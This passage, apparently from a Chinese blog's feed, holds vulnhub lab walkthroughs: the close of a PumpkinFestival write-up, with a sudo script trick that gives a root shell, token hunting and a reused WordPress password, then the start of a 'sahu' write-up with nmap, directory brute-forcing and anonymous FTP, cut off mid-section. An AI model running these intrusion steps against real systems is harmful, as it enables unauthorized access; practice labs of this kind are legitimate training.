-p&quot;</span> &gt;alohomora*<br>jack@pumpkin:~/pumpkins$ <span class="hljs-built_in">ls</span><br>alohomora*<br>jack@pumpkin:~/pumpkins$ sudo /home/jack/pumpkins/alohomora*<br>sudo: /home/jack/pumpkins/alohomora*: <span class="hljs-built_in">command</span> not found<br>jack@pumpkin:~/pumpkins$ <span class="hljs-built_in">chmod</span> +x alohomora\* <br>jack@pumpkin:~/pumpkins$ sudo /home/jack/pumpkins/alohomora*<br>root@pumpkin:~/pumpkins<span class="hljs-comment"># cd /root</span><br>root@pumpkin:/root<span class="hljs-comment"># ls</span><br>PumpkinFestival_Ticket<br>root@pumpkin:/root<span class="hljs-comment"># ls -alih</span><br>total 36K<br>131254 drwx------  3 root root 4.0K Jul 16  2019 .<br>     2 drwxr-xr-x 22 root root 4.0K Jul 12  2019 ..<br>169504 -rw-r--r--  1 root root   55 Jul 15  2019 .bash_logout<br>131227 -rw-r--r--  1 root root 3.1K Feb 20  2014 .bashrc<br> 21326 drwx------  2 root root 4.0K Jul 12  2019 .cache<br>131282 -rw-------  1 root root  369 Jul 13  2019 .mysql_history<br>171922 -rw-------  1 root root   89 Jul 16  2019 .nano_history<br>131226 -rw-r--r--  1 root root  140 Feb 20  2014 .profile<br>131259 -rw-r--r--  1 root root 1.7K Jul 15  2019 PumpkinFestival_Ticket<br>root@pumpkin:/root<span class="hljs-comment"># cat PumpkinFestival_Ticket</span><br>------------------------------------------------------------<br>                        Yippeeeee!<br>  Congratulations on successfully rooting this machine.<br><br>                          ooo<br>                         $ o$<br>                        o $$<br>              <span class="hljs-string">&quot;&quot;</span>$$$    o<span class="hljs-string">&quot; $$ oo &quot;</span><br>          <span class="hljs-string">&quot; o$&quot;</span>$oo$$$<span class="hljs-string">&quot;o$$o$$&quot;</span>$$$$$ o<br>         $<span class="hljs-string">&quot; &quot;</span>o$$$$$$o$$$$$$$$$$$$$<span class="hljs-variable">$o</span>     o<br>      o$<span class="hljs-string">&quot;    &quot;</span>$$$$$$$$$$$$$$$$$$$$$<span class="hljs-variable">$o</span><span class="hljs-string">&quot; &quot;</span>oo  o<br>     <span class="hljs-string">&quot; &quot;</span>     o  <span class="hljs-string">&quot;$$<span class="hljs-variable">$o</span>   o$$$$$$$$$$$oo$$</span><br><span class="hljs-string">    &quot;</span> $     <span class="hljs-string">&quot; &quot;</span>o$$$$$ $$$$$$$$$$$<span class="hljs-string">&quot;$$$$$$<span class="hljs-variable">$o</span></span><br><span class="hljs-string">  o  $       o o$$$$$&quot;</span>$$$$$$$$$$$o$$<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;$$$<span class="hljs-variable">$o</span> &quot;</span> <span class="hljs-string">&quot;</span><br><span class="hljs-string"> o          o$$$$$&quot;</span>    <span class="hljs-string">&quot;$$$$$$$$$$ &quot;</span><span class="hljs-string">&quot; oo $$   o $</span><br><span class="hljs-string"> $  $       $$$$$  $$<span class="hljs-variable">$oo</span> &quot;</span>$$$$$$$<span class="hljs-variable">$o</span> o $$$o$<span class="hljs-variable">$oo</span> o o<br>o        o $$$$$oo$$$$$$o$$$$ <span class="hljs-string">&quot;&quot;</span>$$oo$$$$$$$$<span class="hljs-string">&quot;  &quot;</span> <span class="hljs-string">&quot;o</span><br><span class="hljs-string">&quot;</span>   o    $ <span class="hljs-string">&quot;&quot;</span>$$$$$$$$$$$$$$  o  <span class="hljs-string">&quot;$$$$$$$$$$$$   o &quot;</span><br><span class="hljs-string">&quot;   $      &quot;</span>$$$$$$$$$$$$$$   <span class="hljs-string">&quot;   $$$&quot;</span>$$$$$$$<span class="hljs-variable">$o</span>  o<br>$   o      o$<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;$$$$$$$$    oooo$$ $$$$$$$$&quot;</span>  <span class="hljs-string">&quot;</span><br><span class="hljs-string">$      o&quot;</span><span class="hljs-string">&quot;o $<span class="hljs-variable">$o</span>    $$$$$$$$$$$$$$$$$ &quot;</span><span class="hljs-string">&quot;  o$$$   $ o</span><br><span class="hljs-string"> o     &quot;</span> <span class="hljs-string">&quot;o &quot;</span>$$$$  $$$$$<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot; $  o$$$$$&quot;</span><span class="hljs-string">&quot; o o</span><br><span class="hljs-string"> &quot;</span>  <span class="hljs-string">&quot; o  o<span class="hljs-variable">$o</span>&quot;</span> $$$<span class="hljs-variable">$o</span>   <span class="hljs-string">&quot;&quot;</span>           o  o$$$$$<span class="hljs-string">&quot;   o</span><br><span class="hljs-string">  $         o$$$$$$<span class="hljs-variable">$oo</span>            &quot;</span>oo$$$$$$$<span class="hljs-string">&quot;    o</span><br><span class="hljs-string">  &quot;</span>$   o o<span class="hljs-variable">$o</span> <span class="hljs-variable">$o</span> o$$$$$<span class="hljs-string">&quot;$$$$oooo$$$$$$$$$$$$$$&quot;</span>o<span class="hljs-variable">$o</span><br>    <span class="hljs-string">&quot;o oo  $o$&quot;</span>oo$$$$$o$$$$$$$$$$$$<span class="hljs-string">&quot;$$$$$$$$&quot;</span>o$<span class="hljs-string">&quot;</span><br><span class="hljs-string">     &quot;</span><span class="hljs-variable">$ooo</span> $$o$   $$$$$$$$$$$$$$$$ $$$$$$$<span class="hljs-variable">$o</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">        &quot;</span><span class="hljs-string">&quot; $$$$$$$$$$$$$$$$$$$$$$&quot;</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><br>                         <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;&quot;</span><br>      There were 10 PumpkinTokens on this VM<br><br>------------------------------------------------------------<br>    Love to know your thoughts and suggestions<br>              Tweet me @askjayanth<br>------------------------------------------------------------<br>     <br>  Eagerly waiting to see your detailed walk-throughs<br>            Level 1 : PumpkinGarden<br>            Level 2 : PumpkinRaising<br>            Level 3 : PumpkinFestival<br><br>  Until next time, Mission-Pumpkin v1.0 signing off...<br><br><br>root@pumpkin:/root<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:fa:92:8e brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.140/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fefa:928e/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@pumpkin:/root<span class="hljs-comment"># uname -a</span><br>Linux pumpkin 3.13.0-170-generic <span class="hljs-comment">#220-Ubuntu SMP Thu May 9 12:40:49 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br>root@pumpkin:/root<span class="hljs-comment"># whoami</span><br>root<br></code></pre></td></tr></table></figure><p>提权成功，拿到了 flag</p><p>不过这里提示说一共有十个PumpkinToken</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">jack@pumpkin:~$ <span class="hljs-built_in">ls</span> -liah<br>total 52K<br> 21273 drwx------ 5 jack jack 4.0K Sep 12 13:40 .<br>  8199 drwxr-xr-x 5 root root 4.0K Jul 12  2019 ..<br> 23336 -rw------- 1 root root   74 Sep 12 13:40 .bash_history<br> 21276 -rw-r--r-- 1 jack jack  231 Jul 15  2019 .bash_logout<br> 21285 -rw------- 1 root root   94 Jul 16  2019 .bash_profile<br> 21275 -rw-r--r-- 1 jack jack 3.6K Jul 15  2019 .bashrc<br> 21319 drwx------ 2 jack jack 4.0K Jul 12  2019 .cache<br> 21274 -rw-r--r-- 1 jack jack  675 Jul 12  2019 .profile<br> 23207 drwxrwxr-x 2 jack jack 4.0K Sep 12 13:34 pumpkins<br> 22986 drwxrwxr-x 2 jack jack 4.0K Jul 12  2019 .ssh<br>175806 -rwsr-xr-x 1 root root  11K Jul 15  2019 token<br>jack@pumpkin:~$ file token<br>token: setuid ELF 64-bit LSB  executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), <span class="hljs-keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=977c5f4023cb5e77599fd8194089aa03f155ad88, stripped<br>jack@pumpkin:~$ ./token<br> <br>PumpkinToken : 8d66ef0055b43d80c34917ec6c75f706<br><span class="hljs-comment"># 第八个PumpkinToken</span><br></code></pre></td></tr></table></figure><p>还有一个是在 &#x2F;tokens&#x2F; 目录下，还记得吗，在使用 IP 访问的时候，robots.txt 中给了几个目录，而 <code>/tokens/</code> 目录直接访问得到的结果是 403，但是这个目录爆破还可以得到一个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.140/tokens/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.140/tokens/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              html,txt<br>[+] Timeout:                 10s<br>===============================================================<br>2023/09/11 08:07:22 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 293]<br>/token.txt            (Status: 200) [Size: 48]<br>/.html                (Status: 403) [Size: 293]<br>Progress: 659599 / 661683 (99.69%)<br>===============================================================<br>2023/09/11 08:08:57 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>访问拿到了第九个PumpkinToken</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">PumpkinToken : 2c0e11d2200e2604587c331f02a7ebea<br><span class="hljs-comment"># 第九个PumpkinToken</span><br></code></pre></td></tr></table></figure><p>最后一个藏在了 wordpress 的 admin 用户界面中，其正在编辑的 post 中藏着最后一个。而 admin 的密码，恰恰就是我们以 IP 访问时，最下面的 <code>Alohomora!</code> 当时搜了一下，这是哈利波特里开门的咒语，我没忘密码上去想，即使它是加粗了的字。</p><p><img src="/pic/b2494b14630868f46bec3ef7e4a9c95f_MD5.png"></p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">PumpkinToken</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">f2e00edc353309b40e1aed18e18ab2c4</span><br><span class="hljs-comment"># 第十个PumpkinToken</span><br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这台靶机虽然在某些方面有一丢丢坑（没错，爆破说的就是你）。可是总体上我的收获也很多，最近打靶机的频率下降了，这台靶机在渗透思路和一些细节的把握上对我是一次惊醒——要把有限的精力放在拿到的信息上，如何有效利用已有的信息，并且完善渗透的细节，都是需要继续加油的地方。关于那一串字符串如何解，我的思路明显过于局限了，只考虑了密码，没有往编码的方向去想；关于首页中，加粗的哈利波特中开门咒语，也没忘密码方向去向；目录爆破的时候对于 403 的目录直接不管不顾，没有进一步尝试。这都是宝贵的提醒与经验</p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sahu 靶机</title>
    <link href="/2023/09/1016a340d8b7.html"/>
    <url>/2023/09/1016a340d8b7.html</url>
    
    <content type="html"><![CDATA[<h1 id="sahu-靶机"><a href="#sahu-靶机" class="headerlink" title="sahu 靶机"></a>sahu 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.139                         <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 08:06 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.139<br>Host is up (0.00037s latency).<br>Not shown: 65529 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>21/tcp    open  ftp<br>22/tcp    open  ssh<br>80/tcp    open  http<br>139/tcp   open  netbios-ssn<br>445/tcp   open  microsoft-ds<br>MAC Address: 08:00:27:4D:A7:81 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.41 seconds<br></code></pre></td></tr></table></figure><p>开放了 21,22,80,139,445 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ sudo nmap -sT -sV -sC -O -p21,22,80,139,445 192.168.56.139<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-04 23:34 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.139<br>Host is up (0.00049s latency).<br><br>PORT    STATE SERVICE     VERSION<br>21/tcp  open  ftp         vsftpd 3.0.3<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::ffff:192.168.56.106<br>|      Logged <span class="hljs-keyword">in</span> as ftp<br>|      TYPE: ASCII<br>|      No session bandwidth <span class="hljs-built_in">limit</span><br>|      Session <span class="hljs-built_in">timeout</span> <span class="hljs-keyword">in</span> seconds is 300<br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was 1<br>|      vsFTPd 3.0.3 - secure, fast, stable<br>|_End of status<br>| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br>|_-rw-r--r--    1 0        0             230 Jan 30  2020 ftp.zip<br>22/tcp  open  ssh         OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   3072 e2:78:c5:73:f2:86:cb:cb:02:7f:b6:72:85:61:ac:91 (RSA)<br>|   256 22:1a:ee:1a:98:4f:32:e7:dc:30:43:52:2c:b2:24:06 (ECDSA)<br>|_  256 1a:9b:28:b3:ad:58:32:e9:6c:f3:ea:3b:cf:6b:08:ad (ED25519)<br>80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title.</span><br><span class="hljs-string">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAHU)</span><br><span class="hljs-string">445/tcp open  �.,��U      Samba smbd 4.10.7-Ubuntu (workgroup: SAHU)</span><br><span class="hljs-string">MAC Address: 08:00:27:4D:A7:81 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: Host: SAHU-VIRTUALBOX; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb-os-discovery: </span><br><span class="hljs-string">|   OS: Windows 6.1 (Samba 4.10.7-Ubuntu)</span><br><span class="hljs-string">|   Computer name: sahu-virtualbox</span><br><span class="hljs-string">|   NetBIOS computer name: SAHU-VIRTUALBOX\x00</span><br><span class="hljs-string">|   Domain name: \x00</span><br><span class="hljs-string">|   FQDN: sahu-virtualbox</span><br><span class="hljs-string">|_  System time: 2023-09-05T09:04:26+05:30</span><br><span class="hljs-string">| smb2-time: </span><br><span class="hljs-string">|   date: 2023-09-05T03:34:26</span><br><span class="hljs-string">|_  start_date: N/A</span><br><span class="hljs-string">| smb-security-mode: </span><br><span class="hljs-string">|   account_used: guest</span><br><span class="hljs-string">|   authentication_level: user</span><br><span class="hljs-string">|   challenge_response: supported</span><br><span class="hljs-string">|_  message_signing: disabled (dangerous, but default)</span><br><span class="hljs-string">| smb2-security-mode: </span><br><span class="hljs-string">|   3:1:1: </span><br><span class="hljs-string">|_    Message signing enabled but not required</span><br><span class="hljs-string">|_nbstat: NetBIOS name: SAHU-VIRTUALBOX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="hljs-string">|_clock-skew: mean: -1h50m02s, deviation: 3h10m31s, median: -2s</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 19.55 seconds</span><br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统，ftp 存在匿名登录。</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>目录爆破一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ sudo dirsearch -u http://192.168.56.139/                  <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                     <br> (_||| _) (/_(_|| (_| )                                                                                              <br>                                                                                                                     <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.56.139/-_23-09-04_23-57-31.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-09-04_23-57-31.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.56.139/<br><br>[23:57:31] Starting: <br>[23:57:33] 403 -  279B  - /.ht_wsr.txt                                     <br>[23:57:33] 403 -  279B  - /.htaccess.orig<br>[23:57:33] 403 -  279B  - /.htaccess_sc<br>[23:57:33] 403 -  279B  - /.htaccess.sample<br>[23:57:33] 403 -  279B  - /.htaccess.save<br>[23:57:33] 403 -  279B  - /.htaccess.bak1<br>[23:57:33] 403 -  279B  - /.htaccess_orig<br>[23:57:33] 403 -  279B  - /.htaccess_extra<br>[23:57:33] 403 -  279B  - /.htaccessBAK<br>[23:57:33] 403 -  279B  - /.htaccessOLD<br>[23:57:33] 403 -  279B  - /.html<br>[23:57:33] 403 -  279B  - /.htaccessOLD2                                   <br>[23:57:33] 403 -  279B  - /.htm<br>[23:57:33] 403 -  279B  - /.htpasswd_test<br>[23:57:33] 403 -  279B  - /.htpasswds<br>[23:57:33] 403 -  279B  - /.httr-oauth                                     <br>[23:57:50] 200 -  194B  - /index.php                                        <br>[23:57:59] 403 -  279B  - /server-status                                    <br>[23:57:59] 403 -  279B  - /server-status/<br></code></pre></td></tr></table></figure><p>没什么有价值的信息，换一个目录爆破工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.139 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,rar,zip,sql<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.139<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              php,txt,rar,zip,sql<br>[+] Timeout:                 10s<br>===============================================================<br>2023/09/04 23:58:47 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.php            (Status: 200) [Size: 194]<br>/H                    (Status: 301) [Size: 312] [--&gt; http://192.168.56.139/H/]<br>/server-status        (Status: 403) [Size: 279]<br>Progress: 1323243 / 1323366 (99.99%)<br>===============================================================<br>2023/09/05 00:02:02 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>只有一个 <code>/H</code> ，再换一个工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sahu]<br>└─$ sudo feroxbuster -u http://192.168.56.139 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.10.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://192.168.56.139<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<br> 👌  Status Codes          │ All Status Codes!<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.10.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ <span class="hljs-literal">true</span><br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter<br>403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter<br>200      GET      494l     1388w   129302c http://192.168.56.139/Haryana-1-1.jpg<br>200      GET       10l       14w      194c http://192.168.56.139/<br>301      GET        9l       28w      312c http://192.168.56.139/H =&gt; http://192.168.56.139/H/<br>301      GET        9l       28w      314c http://192.168.56.139/H/A =&gt; http://192.168.56.139/H/A/<br>301      GET        9l       28w      316c http://192.168.56.139/H/A/R =&gt; http://192.168.56.139/H/A/R/<br>[<span class="hljs-comment">####################] - 4m    882197/882197  0s      found:5       errors:9660   </span><br>[<span class="hljs-comment">####################] - 4m    220546/220546  859/s   http://192.168.56.139/ </span><br>[<span class="hljs-comment">####################] - 4m    220546/220546  858/s   http://192.168.56.139/H/ </span><br>[<span class="hljs-comment">####################] - 4m    220546/220546  858/s   http://192.168.56.139/H/A/ </span><br>[<span class="hljs-comment">####################] - 4m    220546/220546  858/s   http://192.168.56.139/H/A/R/ </span><br></code></pre></td></tr></table></figure><h2 id="隐藏目录"><a href="#隐藏目录" class="headerlink" title="隐藏目录"></a>隐藏目录</h2><p><code>http://192.168.56.139/H/A/R/</code> 这个目录看起来有意思，看一眼 Web 界面</p><p><img src="/pic/8faa9a00ffbb51578cc8129c272a98db_MD5.png"></p><p>这个标题有意思，尝试 <code>http://192.168.56.139/H/A/R/Y/A/N/A</code> </p><p><img src="/pic/416bba4b4b395a7e11573a62c87becf4_MD5.png"></p><p>看到了一个暗示</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"># <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> extract <span class="hljs-keyword">with</span> hurrry<br></code></pre></td></tr></table></figure><h2 id="FTP-匿名登录"><a href="#FTP-匿名登录" class="headerlink" title="FTP 匿名登录"></a>FTP 匿名登录</h2><p>FTP 匿名登录看一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 